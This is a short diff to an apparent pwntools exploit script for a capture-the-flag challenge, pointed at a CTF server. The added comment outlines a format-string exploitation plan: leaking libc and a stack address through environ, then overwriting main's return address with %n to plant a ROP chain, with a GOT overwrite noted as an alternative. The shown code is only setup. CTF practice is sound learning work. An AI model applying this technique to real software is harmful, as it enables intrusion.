@@ -1,12 +1,25 @@
 from pwn import *
 
+'''
+recon:
+ - this is the same program as ret2win but without the buffer overflow
+exploitation:
+  NOTE: overwriting the global offset table entry for printf can also work since RELRO is disabled,
+        this is easier than what's shown below lol
+  - leak the libc address using the format string.
+  - libc has a variable named (environ) which contains a stack address,
+    since we know where libc is, we can leak the value of environ to get a stack leak.
+    (it can also be obtained with the format string vuln as usual);
+  - we can use the %n format specifier to overwrite the return address of main with a ROP chain.
+'''
+
 context.binary = elf = ELF("./challenge/chal")
 libc = ELF("./challenge/libc.so.6")
 
 OFFSET = 6
 
 # p = elf.process()
-p = remote("localhost", 5000)
+p = remote("chal.ctf.ingeniums.club", 1338)
 assert p
 
 def recv_addr():
